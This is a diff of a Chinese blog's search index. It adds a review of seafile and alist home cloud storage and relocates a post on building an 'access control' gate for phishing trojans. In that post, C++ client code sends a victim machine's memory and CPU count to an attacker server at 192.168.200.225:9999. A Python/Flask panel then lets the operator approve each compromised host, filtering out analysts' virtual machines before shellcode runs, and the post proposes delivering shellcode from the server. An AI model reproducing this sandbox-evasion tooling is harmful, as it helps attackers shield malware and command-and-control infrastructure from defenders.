+<p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/11/18/race/#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3">条件竞争学习 之 DirtyCow分析</a></p>
+<p><a href="https://bbs.kanxue.com/thread-264199.htm#msg_header_h3_6">Linux内核[CVE-2016-5195] (dirty COW)原理分析</a></p>
+<p><a href="https://tsitsiflora.medium.com/dirty-cow-vulnerability-an-analysis-fdf50243dc6">Dirty Cow Vulnerability: An Analysis</a></p>
 ]]></content>
       <categories>
-        <category>使用体验</category>
+        <category>linux</category>
       </categories>
       <tags>
-        <tag>alist</tag>
-        <tag>seafile</tag>
+        <tag>提权</tag>
       </tags>
   </entry>
   <entry>
@@ -1006,6 +1109,60 @@ InitialContext#lookup</p>
       </tags>
   </entry>
   <entry>
+    <title>seafile和alist使用体验</title>
+    <url>/post/seafile%E5%92%8Calist%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/</url>
+    <content><![CDATA[<h3 id="背景">背景</h3>
+<p>家里有一台十年前的空闲主机，处理器是赛扬j1900，主板是梅捷SY-1900，平时没怎么使用，正好主板上空着一个sata2接口的硬盘位，就想着废物利用，搭建一个属于自己的<strong>私人网盘</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/b714094e70284d59a3211d8279c39bdb.jpg" alt="b714094e70284d59a3211d8279c39bdb.jpg"  /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h3 id="seafile">seafile</h3>
+<p>一开始只对seafile有了解，所以没有考虑其他的网盘系统就直接开始搭建seafile了，seafile的部署和使用比较简单，在win7上部署可以参考下面这位大佬的文章（要自己去获取seafile-server_5.0.3_win32.tar.gz的资源）</p>
+<p><a href="https://blog.csdn.net/wwwwestcn/article/details/122424469">https://blog.csdn.net/wwwwestcn/article/details/122424469</a></p>
+<p>seafile在windows上的搭建方法比较简单，整个过程没有遇到什么太难的问题，接下来就我自己的体验来谈谈seafile的优缺点</p>
+<p>优点：</p>
+<p>​    1.支持<strong>多平台客户端</strong>访问、连手机都有专业的app</p>
+<p>​    2.对本地储存的数据进行了<strong>加密</strong>、无法在本地进行查看（这一点因人而异，我认为是优点）</p>
+<p>​    3.访问时必须要输入密码，提高了数据的安全性</p>
+<p>缺点：</p>
+<p>​    1.大于30M的数据只能下载<strong>不能在线预览</strong>，想要线上看视频基本上是不可能的了（这是后来换alist的主要原因）</p>
+<p>​    2.windows版本的<strong>服务端</strong>已经停止更新了，只能自己去找老的版本下载</p>
+<p>​    3.配置有些复杂，访问是用的8000端口、上传是用的8082端口，意味着进行端口转发或者配置反代理服务器的时候需要同时对两个端口进行操作</p>
+<p><img src="https://img-blog.csdnimg.cn/17f9bc567d1d42b9b38de90751182d38.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h3 id="alist">alist</h3>
+<p>发现seafile的缺点以后，就一直在找其他支持预览大体积文件的私人网盘系统，最终看到了其他博主搭建的alist网盘，发现对预览视频大小没有限制就开始部署alist了</p>
+<p>alist的部署更加简单，具体可以看这位博主的文章</p>
+<p><a href="https://blog.csdn.net/weixin_43957923/article/details/128045524">Alist搭建_「已注销」的博客-CSDN博客_alist搭建教程</a></p>
+<p>同样讲一下alist的优缺点</p>
+<p>优点：</p>
+<p>​    1.搭建简单、配置也不麻烦、页面简易美观</p>
+<p>​    2.支持大体积文件的在线预览、不用下载也能观看</p>
+<p>缺点：</p>
+<p>​    1.没有客户端工具只能通过网页端访问资源</p>
+<p>​    2.默认内容对所有访问用户开放、隐私的内容和相关密码需要自己配置</p>
+<p>​    3.可以通过图片视图大致预览图片列表、希望视频也能有个封面查看</p>
+<p>​    4.有点“重”，内容多的话要加载很久</p>
+<p>这里alist的缺点很多，主要也是因为用alist的体验比较久，但目前来说我对alist的使用是比较满意的，并且alist还支持和百度网盘、阿里网盘、onedrive等知名网盘的联动</p>
+<h3 id="alist的安全问题">alist的安全问题</h3>
+<p>利用黑暗搜索引擎对含有alist的特征网页进行搜索</p>
+<p><img src="https://img-blog.csdnimg.cn/d8e57c2b9ad746fabebceedd38332d81.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>可以看到搜索结果多达一万多条，说明使用alist的用户群还是比较大的，而alist搭建过程中如果管理员没有进行特殊配置的话，所上传的内容是默认对所有访客用户开放的，也就是说你上传的文件没有经过隐私处理就直接暴露在了公网上的话，所有人都可以看到你的文件，如果此时又挂载了百度网盘等其他云储存服务，那么这些网盘中的内容也同样是对外开放的，而这些网盘一般都有同步手机信息、相册、聊天记录等功能，所以极易造成个人隐私泄漏</p>
+<p><img src="https://img-blog.csdnimg.cn/c811906dc6474fadbf5ef3751dee8221.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>（上图是搜索结果中随意点开的一个网页，可以看到网页挂载了很多的网盘，网盘里的内容所有人可见）</p>
+<p>为了防止这种隐私泄漏，我们需要对隐私文件进行<strong>加密或隐藏</strong>，加密方法在alist的说明文档中有</p>
+<p><a href="https://alist.nn.ci/zh/guide/advanced/meta.html">元信息 | AList文档 (nn.ci)</a></p>
+<p>同时也可以参考下面这位up主的视频</p>
+<p><a href="https://b23.tv/IYeqcm6">【Alist】Alist的四大功能使用教程_哔哩哔哩_bilibili</a></p>
+<h3 id="最后">最后</h3>
+<p>搭建私人网盘一定要注意个人信息不被泄露，最好不要直接暴露在公网上，想要访问的话可以通过内网穿透工具实现。</p>
+]]></content>
+      <categories>
+        <category>使用体验</category>
+      </categories>
+      <tags>
+        <tag>alist</tag>
+        <tag>seafile</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Zerotier的使用体验</title>
     <url>/post/zerotier/</url>
     <content><![CDATA[<h1 id="背景">背景</h1>
@@ -1040,6 +1197,60 @@ InitialContext#lookup</p>
       </categories>
       <tags>
         <tag>zerotier</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>一个简单的准接入</title>
+    <url>/post/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E5%87%86%E6%8E%A5%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="目标">目标</h1>
+<p>教育护网的时候出现了钓鱼的木马样本被安全人员分析导致cs服务器的ip被封的情况，就想着写一个简单的<code>准接入控制平台</code>，来控制肉鸡是否允许连接至cs服务器。</p>
+<p>理想效果是：<strong>点击木马以后，会先发送连接请求到接入控制服务器，在服务器上允许接入以后，木马运行shellcode，否则程序结束。</strong></p>
+<p>肉鸡在请求连接的时候，会携带电脑的部分信息（处理器数量、内存大小等），方便攻击者判断是否为虚拟机环境</p>
+<h1 id="开搞">开搞</h1>
+<p>思路：控制服务器打算用python的<code>flask</code>来写，客户端与服务器的通信采用<code>socket连接</code></p>
+<ol>
+<li>客户端会发送自己的<code>内存大小</code>以及<code>处理器数量</code>给服务端</li>
+<li>服务端将数据在网页中显示</li>
+<li>攻击者选择是否允许接入</li>
+<li>将选择结果返回给客户端</li>
+</ol>
+<h2 id="获取内存大小以及处理器数量">获取内存大小以及处理器数量</h2>
+<p>windows中自带了API可以非常方便的用来获取这两个参数，分别是<code>GlobalMemoryStatusEx</code>方法和<code>GetSystemInfo</code>方法</p>
+<p>具体代码：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取内存大小</span></span><br><span class="line">MEMORYSTATUSEX meminfo;</span><br><span class="line">meminfo.dwLength = <span class="built_in">sizeof</span>(MEMORYSTATUSEX);</span><br><span class="line"><span class="built_in">GlobalMemoryStatusEx</span>(&amp;meminfo);</span><br><span class="line">DWORDLONG  memory_num = meminfo.ullTotalPhys / (<span class="number">1024</span> * <span class="number">1024</span>);</span><br><span class="line"><span class="comment">//获取处理器数量</span></span><br><span class="line">SYSTEM_INFO sysinfo;</span><br><span class="line"><span class="built_in">GetSystemInfo</span>(&amp;sysinfo);</span><br><span class="line">DWORD core_count = sysinfo.dwNumberOfProcessors; </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">to_string</span>(memory_num)+ <span class="string">&quot;,&quot;</span>+ <span class="built_in">to_string</span>(core_count);</span><br></pre></td></tr></table></figure>
+<p>如果电脑是16G内存带有16个处理器的话，该程序会返回一个字符串“16000,16”</p>
+<h2 id="socket客户端">socket客户端</h2>
+<p>用c++来写socket主要利用的是<code>ws2_32.lib</code>，所以要先导入</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br></pre></td></tr></table></figure>
+<p>接下来就是调用对应的api进行操作了，整体代码为:</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化Winsock库</span></span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> iResult = <span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;WSAStartup failed: &quot;</span> &lt;&lt; iResult &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个TCP socket</span></span><br><span class="line">SOCKET ConnectSocket = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (ConnectSocket == INVALID_SOCKET) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;socket failed: &quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定服务端的IP地址和端口号</span></span><br><span class="line">sockaddr_in serverAddr;</span><br><span class="line">serverAddr.sin_family = AF_INET;</span><br><span class="line">serverAddr.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;192.168.200.225&quot;</span>); <span class="comment">// 服务端IP地址</span></span><br><span class="line">serverAddr.sin_port = <span class="built_in">htons</span>(<span class="number">9999</span>); <span class="comment">// 服务端端口号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 连接到服务端</span></span><br><span class="line">iResult = <span class="built_in">connect</span>(ConnectSocket, (SOCKADDR*)&amp;serverAddr, <span class="built_in">sizeof</span>(serverAddr));</span><br><span class="line"><span class="keyword">if</span> (iResult == SOCKET_ERROR) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;connect failed: &quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">closesocket</span>(ConnectSocket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送数据到服务端</span></span><br><span class="line">iResult = <span class="built_in">send</span>(ConnectSocket, sendData.<span class="built_in">c_str</span>(), sendData.<span class="built_in">length</span>(), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (iResult == SOCKET_ERROR) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;send failed: &quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">closesocket</span>(ConnectSocket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收服务端返回的数据</span></span><br><span class="line"><span class="type">char</span> recvData[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">iResult = <span class="built_in">recv</span>(ConnectSocket, recvData, <span class="built_in">sizeof</span>(recvData), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (iResult &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Received: &quot;</span> &lt;&lt; recvData[<span class="number">0</span>] &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">if</span> (recvData[<span class="number">0</span>] == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;服务端准许接入&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;服务端不准许接入&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (iResult == <span class="number">0</span>) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Connection closed&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;recv failed: &quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭socket连接</span></span><br><span class="line"><span class="built_in">closesocket</span>(ConnectSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br></pre></td></tr></table></figure>
+<p>上述代码会通过socket连接到192.168.200.225的9999端口，发送<code>sendData</code>，并等待返回数据，如果返回1则输出“服务端准许接入”，返回0则输出“服务端不准许接入”</p>
+<h2 id="socket服务端">socket服务端</h2>
+<p>服务端用python来写，通过<code>socketserver</code>这个包来处理多个客户端的连接请求。</p>
+<p>首先定义一个<code>socket_server_start</code>方法来监听<code>socket请求</code>，当连接建立以后将会调用<code>MyTCPHandler类</code>的<code>handle</code>方法。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">socket_server_start</span>():</span><br><span class="line">    HOST, PORT = <span class="string">&quot;192.168.200.225&quot;</span>, <span class="number">9999</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;server start listen on &#x27;</span>+PORT)</span><br><span class="line">    <span class="keyword">with</span> socketserver.ThreadingTCPServer((HOST, PORT), MyTCPHandler) <span class="keyword">as</span> server:</span><br><span class="line">        server.serve_forever()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyTCPHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Server is listening on &#123;&#125;:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.client_address[<span class="number">0</span>], self.client_address[<span class="number">1</span>]))</span><br><span class="line">        data = self.request.recv(<span class="number">1024</span>).strip().decode()</span><br><span class="line">        memory,core  = data.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;内存大小为：&#123;&#125;MB，处理器数量为：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(memory,core))</span><br></pre></td></tr></table></figure>
+<p>在获取到计算机硬件信息后，将信息存储到一个列表里，通过flask创建一个路由用来返回json格式的数据，再在前端通过fetch来获取数据并显示出来</p>
+<h2 id="显示数据">显示数据</h2>
+<p>通过displayBox函数将收到的数据显示出来</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">displayBox</span>(<span class="params">time,ip, memory, core</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> container = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;container&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> content = <span class="string">&quot;连接时间为：&quot;</span>+time+<span class="string">&quot;&lt;br&gt;IP地址为：&quot;</span> + ip + <span class="string">&quot;&lt;br&gt;内存大小为：&quot;</span> + memory + <span class="string">&quot;MB&lt;br&gt;处理器数量为：&quot;</span> + core + <span class="string">&quot;个&lt;div&gt;&lt;button class = &#x27;button&#x27; onclick=&#x27;AllowFunction(\&quot;&quot;</span> + ip + <span class="string">&quot;\&quot;, 1)&#x27;&gt;允许&lt;/button&gt;&lt;button class = &#x27;button&#x27; onclick=&#x27;AllowFunction(\&quot;&quot;</span> + ip + <span class="string">&quot;\&quot;, 0)&#x27; &gt;拒绝&lt;/button&gt;&lt;/div&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> box = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">  box.<span class="property">className</span> = <span class="string">&quot;red-box&quot;</span>;</span><br><span class="line">  box.<span class="property">innerHTML</span> = content;</span><br><span class="line">  container.<span class="title function_">appendChild</span>(box);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="“允许”或“拒绝”">“允许”或“拒绝”</h2>
+<p>在上述函数中，点击“允许”调用<code>AllowFunction(ip,1)</code>，点击拒绝则调用<code>AllowFunction(ip,0)</code></p>
+<p>通过AllowFunction函数向flask服务器发起一个请求来修改对应ip的准接入结果</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">function</span> <span class="title function_">AllowFunction</span>(<span class="params">ip, isallow</span>)&#123;</span><br><span class="line"><span class="comment">// 构建请求的 URL</span></span><br><span class="line">  <span class="keyword">const</span> url = host+<span class="string">`change?ip=<span class="subst">$&#123;ip&#125;</span>&amp;isallow=<span class="subst">$&#123;isallow&#125;</span>`</span>;</span><br><span class="line">  <span class="comment">// 发起 GET 请求</span></span><br><span class="line">  <span class="title function_">fetch</span>(url)</span><br><span class="line">   .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">     <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;请求成功&quot;</span>);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;请求失败&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;)</span><br><span class="line">   .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;请求发生错误&quot;</span>, error);</span><br><span class="line">   &#125;);</span><br></pre></td></tr></table></figure>
+<p>最后回到socket服务端，将修改后的结果返回给socket客户端</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">self.request.sendall(<span class="built_in">str</span>(cmps[i][<span class="string">&quot;isallow&quot;</span>]).encode())</span><br></pre></td></tr></table></figure>
+<h1 id="效果">效果</h1>
+<p><img src="image-20230702154823650.png" alt="image-20230702154823650"></p>
+<p>第一个是真机，第二个是虚拟机<img src="image-20230702164949851.png" alt="image-20230702164949851"></p>
+<h1 id="升级">升级</h1>
+<p>通过准接入系统可以做的事情还有很多，可以试着携带更多的信息来帮助我们判断是真机还是虚拟机，同时也可以将shellcode放到服务器，允许接入后将shellocde返回给客户端并加载。</p>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>准入</tag>
       </tags>
   </entry>
   <entry>
@@ -1116,60 +1327,6 @@ InitialContext#lookup</p>
       <tags>
         <tag>提权</tag>
         <tag>维权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>一个简单的准接入</title>
-    <url>/post/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E5%87%86%E6%8E%A5%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="目标">目标</h1>
-<p>教育护网的时候出现了钓鱼的木马样本被安全人员分析导致cs服务器的ip被封的情况，就想着写一个简单的<code>准接入控制平台</code>，来控制肉鸡是否允许连接至cs服务器。</p>
-<p>理想效果是：<strong>点击木马以后，会先发送连接请求到接入控制服务器，在服务器上允许接入以后，木马运行shellcode，否则程序结束。</strong></p>
-<p>肉鸡在请求连接的时候，会携带电脑的部分信息（处理器数量、内存大小等），方便攻击者判断是否为虚拟机环境</p>
-<h1 id="开搞">开搞</h1>
-<p>思路：控制服务器打算用python的<code>flask</code>来写，客户端与服务器的通信采用<code>socket连接</code></p>
-<ol>
-<li>客户端会发送自己的<code>内存大小</code>以及<code>处理器数量</code>给服务端</li>
-<li>服务端将数据在网页中显示</li>
-<li>攻击者选择是否允许接入</li>
-<li>将选择结果返回给客户端</li>
-</ol>
-<h2 id="获取内存大小以及处理器数量">获取内存大小以及处理器数量</h2>
-<p>windows中自带了API可以非常方便的用来获取这两个参数，分别是<code>GlobalMemoryStatusEx</code>方法和<code>GetSystemInfo</code>方法</p>
-<p>具体代码：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取内存大小</span></span><br><span class="line">MEMORYSTATUSEX meminfo;</span><br><span class="line">meminfo.dwLength = <span class="built_in">sizeof</span>(MEMORYSTATUSEX);</span><br><span class="line"><span class="built_in">GlobalMemoryStatusEx</span>(&amp;meminfo);</span><br><span class="line">DWORDLONG  memory_num = meminfo.ullTotalPhys / (<span class="number">1024</span> * <span class="number">1024</span>);</span><br><span class="line"><span class="comment">//获取处理器数量</span></span><br><span class="line">SYSTEM_INFO sysinfo;</span><br><span class="line"><span class="built_in">GetSystemInfo</span>(&amp;sysinfo);</span><br><span class="line">DWORD core_count = sysinfo.dwNumberOfProcessors; </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">to_string</span>(memory_num)+ <span class="string">&quot;,&quot;</span>+ <span class="built_in">to_string</span>(core_count);</span><br></pre></td></tr></table></figure>
-<p>如果电脑是16G内存带有16个处理器的话，该程序会返回一个字符串“16000,16”</p>
-<h2 id="socket客户端">socket客户端</h2>
-<p>用c++来写socket主要利用的是<code>ws2_32.lib</code>，所以要先导入</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br></pre></td></tr></table></figure>
-<p>接下来就是调用对应的api进行操作了，整体代码为:</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化Winsock库</span></span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> iResult = <span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;WSAStartup failed: &quot;</span> &lt;&lt; iResult &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个TCP socket</span></span><br><span class="line">SOCKET ConnectSocket = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (ConnectSocket == INVALID_SOCKET) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;socket failed: &quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定服务端的IP地址和端口号</span></span><br><span class="line">sockaddr_in serverAddr;</span><br><span class="line">serverAddr.sin_family = AF_INET;</span><br><span class="line">serverAddr.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;192.168.200.225&quot;</span>); <span class="comment">// 服务端IP地址</span></span><br><span class="line">serverAddr.sin_port = <span class="built_in">htons</span>(<span class="number">9999</span>); <span class="comment">// 服务端端口号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 连接到服务端</span></span><br><span class="line">iResult = <span class="built_in">connect</span>(ConnectSocket, (SOCKADDR*)&amp;serverAddr, <span class="built_in">sizeof</span>(serverAddr));</span><br><span class="line"><span class="keyword">if</span> (iResult == SOCKET_ERROR) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;connect failed: &quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">closesocket</span>(ConnectSocket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送数据到服务端</span></span><br><span class="line">iResult = <span class="built_in">send</span>(ConnectSocket, sendData.<span class="built_in">c_str</span>(), sendData.<span class="built_in">length</span>(), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (iResult == SOCKET_ERROR) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;send failed: &quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">closesocket</span>(ConnectSocket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收服务端返回的数据</span></span><br><span class="line"><span class="type">char</span> recvData[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">iResult = <span class="built_in">recv</span>(ConnectSocket, recvData, <span class="built_in">sizeof</span>(recvData), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (iResult &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Received: &quot;</span> &lt;&lt; recvData[<span class="number">0</span>] &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">if</span> (recvData[<span class="number">0</span>] == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;服务端准许接入&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;服务端不准许接入&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (iResult == <span class="number">0</span>) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Connection closed&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;recv failed: &quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭socket连接</span></span><br><span class="line"><span class="built_in">closesocket</span>(ConnectSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br></pre></td></tr></table></figure>
-<p>上述代码会通过socket连接到192.168.200.225的9999端口，发送<code>sendData</code>，并等待返回数据，如果返回1则输出“服务端准许接入”，返回0则输出“服务端不准许接入”</p>
-<h2 id="socket服务端">socket服务端</h2>
-<p>服务端用python来写，通过<code>socketserver</code>这个包来处理多个客户端的连接请求。</p>
-<p>首先定义一个<code>socket_server_start</code>方法来监听<code>socket请求</code>，当连接建立以后将会调用<code>MyTCPHandler类</code>的<code>handle</code>方法。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">socket_server_start</span>():</span><br><span class="line">    HOST, PORT = <span class="string">&quot;192.168.200.225&quot;</span>, <span class="number">9999</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;server start listen on &#x27;</span>+PORT)</span><br><span class="line">    <span class="keyword">with</span> socketserver.ThreadingTCPServer((HOST, PORT), MyTCPHandler) <span class="keyword">as</span> server:</span><br><span class="line">        server.serve_forever()</span><br></pre></td></tr></table></figure>
